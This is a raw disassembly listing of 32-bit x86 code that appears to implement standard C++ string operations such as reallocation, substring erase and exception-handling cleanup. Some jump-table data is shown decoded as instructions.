  404889:	74 3d                	je     0x4048c8
  40488b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40488e:	8b 49 0c             	mov    0xc(%ecx),%ecx
  404891:	29 c1                	sub    %eax,%ecx
  404893:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404899:	72 03                	jb     0x40489e
  40489b:	8b 40 fc             	mov    -0x4(%eax),%eax
  40489e:	83 ec 0c             	sub    $0xc,%esp
  4048a1:	50                   	push   %eax
  4048a2:	e8 19 14 00 00       	call   0x405cc0
  4048a7:	83 c4 10             	add    $0x10,%esp
  4048aa:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4048ad:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  4048b4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4048b7:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  4048be:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4048c1:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  4048c8:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%ebp)
  4048cf:	83 ec 0c             	sub    $0xc,%esp
  4048d2:	56                   	push   %esi
  4048d3:	e8 1c c8 01 00       	call   0x4210f4
  4048d8:	83 c4 0c             	add    $0xc,%esp
  4048db:	90                   	nop
  4048dc:	7f 48                	jg     0x404926
  4048de:	40                   	inc    %eax
  4048df:	00 7f 48             	add    %bh,0x48(%edi)
  4048e2:	40                   	inc    %eax
  4048e3:	00 7f 48             	add    %bh,0x48(%edi)
  4048e6:	40                   	inc    %eax
  4048e7:	00 7f 48             	add    %bh,0x48(%edi)
  4048ea:	40                   	inc    %eax
  4048eb:	00 7f 48             	add    %bh,0x48(%edi)
  4048ee:	40                   	inc    %eax
  4048ef:	00 7f 48             	add    %bh,0x48(%edi)
  4048f2:	40                   	inc    %eax
  4048f3:	00 7f 48             	add    %bh,0x48(%edi)
  4048f6:	40                   	inc    %eax
  4048f7:	00 83 ec 0c 8b 44    	add    %al,0x448b0cec(%ebx)
  4048fd:	24 10                	and    $0x10,%al
  4048ff:	89 04 24             	mov    %eax,(%esp)
  404902:	e8 b5 ac 01 00       	call   0x41f5bc
  404907:	e8 dc a9 01 00       	call   0x41f2e8
  40490c:	c3                   	ret
  40490d:	90                   	nop
  40490e:	90                   	nop
  40490f:	90                   	nop
  404910:	e9 ab 13 00 00       	jmp    0x405cc0
  404915:	90                   	nop
  404916:	90                   	nop
  404917:	90                   	nop
  404918:	83 ec 0c             	sub    $0xc,%esp
  40491b:	8b 44 24 14          	mov    0x14(%esp),%eax
  40491f:	89 04 24             	mov    %eax,(%esp)
  404922:	e8 d5 60 00 00       	call   0x40a9fc
  404927:	83 c4 0c             	add    $0xc,%esp
  40492a:	c3                   	ret
  40492b:	90                   	nop
  40492c:	83 ec 0c             	sub    $0xc,%esp
  40492f:	8b 44 24 14          	mov    0x14(%esp),%eax
  404933:	89 04 24             	mov    %eax,(%esp)
  404936:	e8 85 13 00 00       	call   0x405cc0
  40493b:	83 c4 0c             	add    $0xc,%esp
  40493e:	c3                   	ret
  40493f:	90                   	nop
  404940:	8b 44 24 04          	mov    0x4(%esp),%eax
  404944:	3b 44 24 08          	cmp    0x8(%esp),%eax
  404948:	0f 94 c0             	sete   %al
  40494b:	c3                   	ret
  40494c:	55                   	push   %ebp
  40494d:	53                   	push   %ebx
  40494e:	57                   	push   %edi
  40494f:	56                   	push   %esi
  404950:	83 ec 0c             	sub    $0xc,%esp
  404953:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  404957:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40495b:	8b 47 14             	mov    0x14(%edi),%eax
  40495e:	89 c1                	mov    %eax,%ecx
  404960:	29 d9                	sub    %ebx,%ecx
  404962:	0f 82 05 01 00 00    	jb     0x404a6d
  404968:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
  40496c:	8b 54 24 20          	mov    0x20(%esp),%edx
  404970:	39 e9                	cmp    %ebp,%ecx
  404972:	77 02                	ja     0x404976
  404974:	89 cd                	mov    %ecx,%ebp
  404976:	39 fa                	cmp    %edi,%edx
  404978:	74 37                	je     0x4049b1
  40497a:	83 ec 04             	sub    $0x4,%esp
  40497d:	6a 00                	push   $0x0
  40497f:	55                   	push   %ebp
  404980:	52                   	push   %edx
  404981:	e8 0a 01 00 00       	call   0x404a90
  404986:	8b 54 24 30          	mov    0x30(%esp),%edx
  40498a:	83 c4 10             	add    $0x10,%esp
  40498d:	84 c0                	test   %al,%al
  40498f:	0f 84 ce 00 00 00    	je     0x404a63
  404995:	8b 4a 18             	mov    0x18(%edx),%ecx
  404998:	8d 72 04             	lea    0x4(%edx),%esi
  40499b:	83 f9 10             	cmp    $0x10,%ecx
  40499e:	72 63                	jb     0x404a03
  4049a0:	8b 06                	mov    (%esi),%eax
  4049a2:	85 ed                	test   %ebp,%ebp
  4049a4:	74 7f                	je     0x404a25
  4049a6:	83 7f 18 0f          	cmpl   $0xf,0x18(%edi)
  4049aa:	77 5f                	ja     0x404a0b
  4049ac:	83 c7 04             	add    $0x4,%edi
  4049af:	eb 5d                	jmp    0x404a0e
  4049b1:	01 dd                	add    %ebx,%ebp
  4049b3:	39 e8                	cmp    %ebp,%eax
  4049b5:	0f 82 c2 00 00 00    	jb     0x404a7d
  4049bb:	8d 77 04             	lea    0x4(%edi),%esi
  4049be:	83 7f 18 0f          	cmpl   $0xf,0x18(%edi)
  4049c2:	77 04                	ja     0x4049c8
  4049c4:	89 f0                	mov    %esi,%eax
  4049c6:	eb 03                	jmp    0x4049cb
  4049c8:	8b 47 04             	mov    0x4(%edi),%eax
  4049cb:	89 6f 14             	mov    %ebp,0x14(%edi)
  4049ce:	c6 04 28 00          	movb   $0x0,(%eax,%ebp,1)
  4049d2:	8b 6f 14             	mov    0x14(%edi),%ebp
  4049d5:	39 dd                	cmp    %ebx,%ebp
  4049d7:	76 18                	jbe    0x4049f1
  4049d9:	85 db                	test   %ebx,%ebx
  4049db:	0f 84 82 00 00 00    	je     0x404a63
  4049e1:	8b 47 18             	mov    0x18(%edi),%eax
  4049e4:	83 f8 0f             	cmp    $0xf,%eax
  4049e7:	77 4c                	ja     0x404a35
  4049e9:	89 f1                	mov    %esi,%ecx
  4049eb:	29 dd                	sub    %ebx,%ebp
  4049ed:	75 4d                	jne    0x404a3c
  4049ef:	eb 62                	jmp    0x404a53
  4049f1:	83 7f 18 0f          	cmpl   $0xf,0x18(%edi)
  4049f5:	76 03                	jbe    0x4049fa
  4049f7:	8b 77 04             	mov    0x4(%edi),%esi
  4049fa:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  404a01:	eb 5d                	jmp    0x404a60
  404a03:	89 f0                	mov    %esi,%eax
  404a05:	85 ed                	test   %ebp,%ebp
  404a07:	75 9d                	jne    0x4049a6
  404a09:	eb 1a                	jmp    0x404a25
  404a0b:	8b 7f 04             	mov    0x4(%edi),%edi
  404a0e:	01 df                	add    %ebx,%edi
  404a10:	83 ec 04             	sub    $0x4,%esp
  404a13:	55                   	push   %ebp
  404a14:	57                   	push   %edi
  404a15:	50                   	push   %eax
  404a16:	e8 95 ce 00 00       	call   0x4118b0
  404a1b:	83 c4 10             	add    $0x10,%esp
  404a1e:	8b 54 24 20          	mov    0x20(%esp),%edx
  404a22:	8b 4a 18             	mov    0x18(%edx),%ecx
  404a25:	83 f9 10             	cmp    $0x10,%ecx
  404a28:	72 02                	jb     0x404a2c
  404a2a:	8b 36                	mov    (%esi),%esi
  404a2c:	89 6a 14             	mov    %ebp,0x14(%edx)
  404a2f:	c6 04 2e 00          	movb   $0x0,(%esi,%ebp,1)
  404a33:	eb 2e                	jmp    0x404a63
  404a35:	8b 4f 04             	mov    0x4(%edi),%ecx
  404a38:	29 dd                	sub    %ebx,%ebp
  404a3a:	74 17                	je     0x404a53
  404a3c:	01 cb                	add    %ecx,%ebx
  404a3e:	83 ec 04             	sub    $0x4,%esp
  404a41:	55                   	push   %ebp
  404a42:	53                   	push   %ebx
  404a43:	51                   	push   %ecx
  404a44:	89 d3                	mov    %edx,%ebx
  404a46:	e8 7e cf 00 00       	call   0x4119c9
  404a4b:	89 da                	mov    %ebx,%edx
  404a4d:	83 c4 10             	add    $0x10,%esp
  404a50:	8b 47 18             	mov    0x18(%edi),%eax
  404a53:	83 f8 0f             	cmp    $0xf,%eax
  404a56:	76 03                	jbe    0x404a5b
  404a58:	8b 77 04             	mov    0x4(%edi),%esi
  404a5b:	89 6f 14             	mov    %ebp,0x14(%edi)
  404a5e:	01 ee                	add    %ebp,%esi
  404a60:	c6 06 00             	movb   $0x0,(%esi)
  404a63:	89 d0                	mov    %edx,%eax
  404a65:	83 c4 0c             	add    $0xc,%esp
  404a68:	5e                   	pop    %esi
  404a69:	5f                   	pop    %edi
  404a6a:	5b                   	pop    %ebx
  404a6b:	5d                   	pop    %ebp
  404a6c:	c3                   	ret
  404a6d:	83 ec 0c             	sub    $0xc,%esp
  404a70:	68 18 25 42 00       	push   $0x422518
  404a75:	e8 9e 9c 00 00       	call   0x40e718
  404a7a:	83 c4 0c             	add    $0xc,%esp
  404a7d:	83 ec 0c             	sub    $0xc,%esp
  404a80:	68 18 25 42 00       	push   $0x422518
  404a85:	e8 8e 9c 00 00       	call   0x40e718
  404a8a:	83 c4 0c             	add    $0xc,%esp
  404a8d:	90                   	nop
  404a8e:	90                   	nop
  404a8f:	90                   	nop
  404a90:	55                   	push   %ebp
  404a91:	53                   	push   %ebx
  404a92:	57                   	push   %edi
  404a93:	56                   	push   %esi
  404a94:	83 ec 0c             	sub    $0xc,%esp
  404a97:	8b 74 24 24          	mov    0x24(%esp),%esi
  404a9b:	83 fe ff             	cmp    $0xffffffff,%esi
  404a9e:	0f 84 a1 00 00 00    	je     0x404b45
  404aa4:	8b 7c 24 20          	mov    0x20(%esp),%edi
  404aa8:	8b 47 18             	mov    0x18(%edi),%eax
  404aab:	39 f0                	cmp    %esi,%eax
  404aad:	73 12                	jae    0x404ac1
  404aaf:	83 ec 04             	sub    $0x4,%esp
  404ab2:	ff 77 14             	push   0x14(%edi)
  404ab5:	56                   	push   %esi
  404ab6:	57                   	push   %edi
  404ab7:	e8 9c 00 00 00       	call   0x404b58
  404abc:	83 c4 10             	add    $0x10,%esp
  404abf:	eb 77                	jmp    0x404b38
  404ac1:	83 fe 0f             	cmp    $0xf,%esi
  404ac4:	77 5a                	ja     0x404b20
  404ac6:	8a 4c 24 28          	mov    0x28(%esp),%cl
  404aca:	84 c9                	test   %cl,%cl
  404acc:	74 52                	je     0x404b20
  404ace:	8b 4f 14             	mov    0x14(%edi),%ecx
  404ad1:	39 f1                	cmp    %esi,%ecx
  404ad3:	89 f3                	mov    %esi,%ebx
  404ad5:	77 02                	ja     0x404ad9
  404ad7:	89 cb                	mov    %ecx,%ebx
  404ad9:	83 f8 10             	cmp    $0x10,%eax
  404adc:	72 31                	jb     0x404b0f
  404ade:	8d 4f 04             	lea    0x4(%edi),%ecx
  404ae1:	8b 29                	mov    (%ecx),%ebp
  404ae3:	85 db                	test   %ebx,%ebx
  404ae5:	74 11                	je     0x404af8
  404ae7:	83 ec 04             	sub    $0x4,%esp
  404aea:	53                   	push   %ebx
  404aeb:	55                   	push   %ebp
  404aec:	51                   	push   %ecx
  404aed:	e8 be cd 00 00       	call   0x4118b0
  404af2:	83 c4 10             	add    $0x10,%esp
  404af5:	8b 47 18             	mov    0x18(%edi),%eax
  404af8:	40                   	inc    %eax
  404af9:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404afe:	72 03                	jb     0x404b03
  404b00:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  404b03:	83 ec 0c             	sub    $0xc,%esp
  404b06:	55                   	push   %ebp
  404b07:	e8 b4 11 00 00       	call   0x405cc0
  404b0c:	83 c4 10             	add    $0x10,%esp
  404b0f:	c7 47 18 0f 00 00 00 	movl   $0xf,0x18(%edi)
  404b16:	89 5f 14             	mov    %ebx,0x14(%edi)
  404b19:	c6 44 1f 04 00       	movb   $0x0,0x4(%edi,%ebx,1)
  404b1e:	eb 18                	jmp    0x404b38
  404b20:	85 f6                	test   %esi,%esi
  404b22:	75 14                	jne    0x404b38
  404b24:	8d 4f 04             	lea    0x4(%edi),%ecx
  404b27:	83 f8 10             	cmp    $0x10,%eax
  404b2a:	72 02                	jb     0x404b2e
  404b2c:	8b 09                	mov    (%ecx),%ecx
  404b2e:	c7 47 14 00 00 00 00 	movl   $0x0,0x14(%edi)
  404b35:	c6 01 00             	movb   $0x0,(%ecx)
  404b38:	85 f6                	test   %esi,%esi
  404b3a:	0f 95 c0             	setne  %al
  404b3d:	83 c4 0c             	add    $0xc,%esp
  404b40:	5e                   	pop    %esi
  404b41:	5f                   	pop    %edi
  404b42:	5b                   	pop    %ebx
  404b43:	5d                   	pop    %ebp
  404b44:	c3                   	ret
  404b45:	83 ec 0c             	sub    $0xc,%esp
  404b48:	68 30 25 42 00       	push   $0x422530
  404b4d:	e8 da 99 00 00       	call   0x40e52c
  404b52:	83 c4 0c             	add    $0xc,%esp
  404b55:	90                   	nop
  404b56:	90                   	nop
  404b57:	90                   	nop
  404b58:	55                   	push   %ebp
  404b59:	89 e5                	mov    %esp,%ebp
  404b5b:	53                   	push   %ebx
  404b5c:	57                   	push   %edi
  404b5d:	56                   	push   %esi
  404b5e:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  404b64:	8b 45 10             	mov    0x10(%ebp),%eax
  404b67:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404b6a:	8b 55 08             	mov    0x8(%ebp),%edx
  404b6d:	89 55 f0             	mov    %edx,-0x10(%ebp)
  404b70:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  404b73:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404b76:	8b 75 ec             	mov    -0x14(%ebp),%esi
  404b79:	83 ce 0f             	or     $0xf,%esi
  404b7c:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  404b7f:	c7 45 90 ec 04 42 00 	movl   $0x4204ec,-0x70(%ebp)
  404b86:	c7 45 94 f8 26 42 00 	movl   $0x4226f8,-0x6c(%ebp)
  404b8d:	89 6d 98             	mov    %ebp,-0x68(%ebp)
  404b90:	89 65 a0             	mov    %esp,-0x60(%ebp)
  404b93:	c7 45 98 42 4d 40 00 	movl   $0x404d42,-0x68(%ebp)
  404b9a:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  404ba0:	e8 b0 c5 01 00       	call   0x421155
  404ba5:	83 fe ff             	cmp    $0xffffffff,%esi
  404ba8:	74 2e                	je     0x404bd8
  404baa:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404bad:	8b 48 18             	mov    0x18(%eax),%ecx
  404bb0:	89 cf                	mov    %ecx,%edi
  404bb2:	d1 ef                	shr    $1,%edi
  404bb4:	ba ab aa aa aa       	mov    $0xaaaaaaab,%edx
  404bb9:	89 f0                	mov    %esi,%eax
  404bbb:	f7 e2                	mul    %edx
  404bbd:	d1 ea                	shr    $1,%edx
  404bbf:	39 d7                	cmp    %edx,%edi
  404bc1:	89 f3                	mov    %esi,%ebx
  404bc3:	76 13                	jbe    0x404bd8
  404bc5:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  404bca:	29 f8                	sub    %edi,%eax
  404bcc:	39 c1                	cmp    %eax,%ecx
  404bce:	0f 87 59 01 00 00    	ja     0x404d2d
  404bd4:	01 cf                	add    %ecx,%edi
  404bd6:	89 fb                	mov    %edi,%ebx
  404bd8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404bdb:	89 d8                	mov    %ebx,%eax
  404bdd:	40                   	inc    %eax
  404bde:	74 41                	je     0x404c21
  404be0:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404be5:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  404be8:	72 40                	jb     0x404c2a
  404bea:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404bed:	83 f8 dd             	cmp    $0xffffffdd,%eax
  404bf0:	0f 83 3a 01 00 00    	jae    0x404d30
  404bf6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404bf9:	8d 4b 24             	lea    0x24(%ebx),%ecx
  404bfc:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404bff:	c7 85 7c ff ff ff 02 	movl   $0x2,-0x84(%ebp)
  404c06:	00 00 00 
  404c09:	89 0c 24             	mov    %ecx,(%esp)
  404c0c:	e8 eb 5d 00 00       	call   0x40a9fc
  404c11:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c14:	89 c6                	mov    %eax,%esi
  404c16:	83 c6 23             	add    $0x23,%esi
  404c19:	83 e6 e0             	and    $0xffffffe0,%esi
  404c1c:	89 46 fc             	mov    %eax,-0x4(%esi)
  404c1f:	eb 29                	jmp    0x404c4a
  404c21:	31 f6                	xor    %esi,%esi
  404c23:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404c28:	eb 23                	jmp    0x404c4d
  404c2a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c2d:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  404c30:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  404c33:	c7 85 7c ff ff ff 03 	movl   $0x3,-0x84(%ebp)
  404c3a:	00 00 00 
  404c3d:	89 04 24             	mov    %eax,(%esp)
  404c40:	e8 b7 5d 00 00       	call   0x40a9fc
  404c45:	89 c6                	mov    %eax,%esi
  404c47:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  404c4a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  404c4d:	89 75 cc             	mov    %esi,-0x34(%ebp)
  404c50:	89 45 ac             	mov    %eax,-0x54(%ebp)
  404c53:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  404c56:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  404c5a:	74 32                	je     0x404c8e
  404c5c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404c5f:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404c62:	83 c1 04             	add    $0x4,%ecx
  404c65:	83 78 18 10          	cmpl   $0x10,0x18(%eax)
  404c69:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  404c6c:	72 07                	jb     0x404c75
  404c6e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  404c71:	8b 00                	mov    (%eax),%eax
  404c73:	eb 03                	jmp    0x404c78
  404c75:	8b 45 c8             	mov    -0x38(%ebp),%eax
  404c78:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404c7b:	8b 55 cc             	mov    -0x34(%ebp),%edx
  404c7e:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  404c82:	89 44 24 04          	mov    %eax,0x4(%esp)
  404c86:	89 14 24             	mov    %edx,(%esp)
  404c89:	e8 22 cc 00 00       	call   0x4118b0
  404c8e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c91:	8b 40 18             	mov    0x18(%eax),%eax
  404c94:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404c97:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  404c9a:	83 f8 10             	cmp    $0x10,%eax
  404c9d:	72 25                	jb     0x404cc4
  404c9f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404ca2:	8b 40 04             	mov    0x4(%eax),%eax
  404ca5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404ca8:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  404cab:	40                   	inc    %eax
  404cac:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404cb1:	8b 45 c0             	mov    -0x40(%ebp),%eax
  404cb4:	72 06                	jb     0x404cbc
  404cb6:	8b 45 c0             	mov    -0x40(%ebp),%eax
  404cb9:	8b 40 fc             	mov    -0x4(%eax),%eax
  404cbc:	89 04 24             	mov    %eax,(%esp)
  404cbf:	e8 fc 0f 00 00       	call   0x405cc0
  404cc4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404cc7:	c7 41 18 0f 00 00 00 	movl   $0xf,0x18(%ecx)
  404cce:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404cd1:	83 c0 04             	add    $0x4,%eax
  404cd4:	89 45 bc             	mov    %eax,-0x44(%ebp)
  404cd7:	8b 45 bc             	mov    -0x44(%ebp),%eax
  404cda:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404cdd:	c7 42 14 00 00 00 00 	movl   $0x0,0x14(%edx)
  404ce4:	c6 00 00             	movb   $0x0,(%eax)
  404ce7:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404cea:	8b 75 cc             	mov    -0x34(%ebp),%esi
  404ced:	89 72 04             	mov    %esi,0x4(%edx)
  404cf0:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404cf3:	8b 75 ac             	mov    -0x54(%ebp),%esi
  404cf6:	89 72 18             	mov    %esi,0x18(%edx)
  404cf9:	83 79 18 10          	cmpl   $0x10,0x18(%ecx)
  404cfd:	72 05                	jb     0x404d04
  404cff:	8b 45 bc             	mov    -0x44(%ebp),%eax
  404d02:	8b 00                	mov    (%eax),%eax
  404d04:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d07:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404d0a:	89 51 14             	mov    %edx,0x14(%ecx)
  404d0d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404d10:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  404d14:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  404d1a:	89 04 24             	mov    %eax,(%esp)
  404d1d:	e8 54 c4 01 00       	call   0x421176
  404d22:	81 c4 8c 00 00 00    	add    $0x8c,%esp
  404d28:	5e                   	pop    %esi
  404d29:	5f                   	pop    %edi
  404d2a:	5b                   	pop    %ebx
  404d2b:	5d                   	pop    %ebp
  404d2c:	c3                   	ret
  404d2d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d30:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  404d33:	c7 85 7c ff ff ff 01 	movl   $0x1,-0x84(%ebp)
  404d3a:	00 00 00 
  404d3d:	e8 b2 97 00 00       	call   0x40e4f4
  404d42:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  404d48:	3d 09 00 00 00       	cmp    $0x9,%eax
  404d4d:	0f 87 1f 01 00 00    	ja     0x404e72
  404d53:	2d 01 00 00 00       	sub    $0x1,%eax
  404d58:	ff 24 85 d0 4e 40 00 	jmp    *0x404ed0(,%eax,4)
  404d5f:	8b 45 80             	mov    -0x80(%ebp),%eax
  404d62:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  404d65:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  404d68:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  404d6b:	89 04 24             	mov    %eax,(%esp)
  404d6e:	e8 49 a8 01 00       	call   0x41f5bc
  404d73:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404d76:	40                   	inc    %eax
  404d77:	0f 84 23 01 00 00    	je     0x404ea0
  404d7d:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404d82:	0f 82 c5 00 00 00    	jb     0x404e4d
  404d88:	83 f8 dd             	cmp    $0xffffffdd,%eax
  404d8b:	0f 83 d2 00 00 00    	jae    0x404e63
  404d91:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404d94:	83 c0 24             	add    $0x24,%eax
  404d97:	c7 85 7c ff ff ff 05 	movl   $0x5,-0x84(%ebp)
  404d9e:	00 00 00 
  404da1:	89 04 24             	mov    %eax,(%esp)
  404da4:	e8 53 5c 00 00       	call   0x40a9fc
  404da9:	e9 f6 00 00 00       	jmp    0x404ea4
  404dae:	8b 45 80             	mov    -0x80(%ebp),%eax
  404db1:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  404db4:	89 45 b0             	mov    %eax,-0x50(%ebp)
  404db7:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  404dba:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  404dc1:	00 00 00 
  404dc4:	e8 5f a8 01 00       	call   0x41f628
  404dc9:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  404dd0:	00 00 00 
  404dd3:	e8 50 a8 01 00       	call   0x41f628
  404dd8:	e9 a8 00 00 00       	jmp    0x404e85
  404ddd:	8b 45 80             	mov    -0x80(%ebp),%eax
  404de0:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  404de3:	89 04 24             	mov    %eax,(%esp)
  404de6:	e8 d1 a7 01 00       	call   0x41f5bc
  404deb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404dee:	8b 40 18             	mov    0x18(%eax),%eax
  404df1:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404df4:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404df7:	83 f8 10             	cmp    $0x10,%eax
  404dfa:	72 25                	jb     0x404e21
  404dfc:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404dff:	8b 40 04             	mov    0x4(%eax),%eax
  404e02:	89 45 d0             	mov    %eax,-0x30(%ebp)
  404e05:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404e08:	40                   	inc    %eax
  404e09:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404e0e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  404e11:	72 06                	jb     0x404e19
  404e13:	8b 45 d0             	mov    -0x30(%ebp),%eax
  404e16:	8b 40 fc             	mov    -0x4(%eax),%eax
  404e19:	89 04 24             	mov    %eax,(%esp)
  404e1c:	e8 9f 0e 00 00       	call   0x405cc0
  404e21:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e24:	c7 40 18 0f 00 00 00 	movl   $0xf,0x18(%eax)
  404e2b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e2e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e31:	c7 41 14 00 00 00 00 	movl   $0x0,0x14(%ecx)
  404e38:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  404e3c:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  404e43:	00 00 00 
  404e46:	e8 fd a6 01 00       	call   0x41f548
  404e4b:	eb 38                	jmp    0x404e85
  404e4d:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  404e54:	00 00 00 
  404e57:	89 04 24             	mov    %eax,(%esp)
  404e5a:	e8 9d 5b 00 00       	call   0x40a9fc
  404e5f:	89 c6                	mov    %eax,%esi
  404e61:	eb 50                	jmp    0x404eb3
  404e63:	c7 85 7c ff ff ff 04 	movl   $0x4,-0x84(%ebp)
  404e6a:	00 00 00 
  404e6d:	e8 82 96 00 00       	call   0x40e4f4
  404e72:	0f 0b                	ud2
  404e74:	8b 45 80             	mov    -0x80(%ebp),%eax
  404e77:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  404e7a:	89 04 24             	mov    %eax,(%esp)
  404e7d:	e8 76 fa ff ff       	call   0x4048f8
  404e82:	83 ec 04             	sub    $0x4,%esp
  404e85:	8b 45 b0             	mov    -0x50(%ebp),%eax
  404e88:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  404e8b:	c7 85 7c ff ff ff ff 	movl   $0xffffffff,-0x84(%ebp)
  404e92:	ff ff ff 
  404e95:	89 04 24             	mov    %eax,(%esp)
  404e98:	e8 57 c2 01 00       	call   0x4210f4
  404e9d:	83 ec 04             	sub    $0x4,%esp
  404ea0:	31 f6                	xor    %esi,%esi
  404ea2:	eb 0f                	jmp    0x404eb3
  404ea4:	89 45 b8             	mov    %eax,-0x48(%ebp)
  404ea7:	8b 45 b8             	mov    -0x48(%ebp),%eax
  404eaa:	8d 70 23             	lea    0x23(%eax),%esi
  404ead:	83 e6 e0             	and    $0xffffffe0,%esi
  404eb0:	89 46 fc             	mov    %eax,-0x4(%esi)
  404eb3:	c7 85 7c ff ff ff ff 	movl   $0xffffffff,-0x84(%ebp)
  404eba:	ff ff ff 
  404ebd:	e8 66 a7 01 00       	call   0x41f628
  404ec2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404ec5:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  404ec8:	e9 80 fd ff ff       	jmp    0x404c4d
  404ecd:	0f 1f 00             	nopl   (%eax)
  404ed0:	5f                   	pop    %edi
  404ed1:	4d                   	dec    %ebp
  404ed2:	40                   	inc    %eax
  404ed3:	00 5f 4d             	add    %bl,0x4d(%edi)
  404ed6:	40                   	inc    %eax
  404ed7:	00 5f 4d             	add    %bl,0x4d(%edi)
  404eda:	40                   	inc    %eax
  404edb:	00 dd                	add    %bl,%ch
  404edd:	4d                   	dec    %ebp
  404ede:	40                   	inc    %eax
  404edf:	00 dd                	add    %bl,%ch
  404ee1:	4d                   	dec    %ebp
  404ee2:	40                   	inc    %eax
  404ee3:	00 dd                	add    %bl,%ch
  404ee5:	4d                   	dec    %ebp
  404ee6:	40                   	inc    %eax
  404ee7:	00 ae 4d 40 00 74    	add    %ch,0x7400404d(%esi)
  404eed:	4e                   	dec    %esi
  404eee:	40                   	inc    %eax
  404eef:	00 74 4e 40          	add    %dh,0x40(%esi,%ecx,2)
  404ef3:	00 55 53             	add    %dl,0x53(%ebp)
  404ef6:	57                   	push   %edi
  404ef7:	56                   	push   %esi
  404ef8:	83 ec 0c             	sub    $0xc,%esp
  404efb:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404eff:	8b 74 24 20          	mov    0x20(%esp),%esi
  404f03:	8d 5f ff             	lea    -0x1(%edi),%ebx
  404f06:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
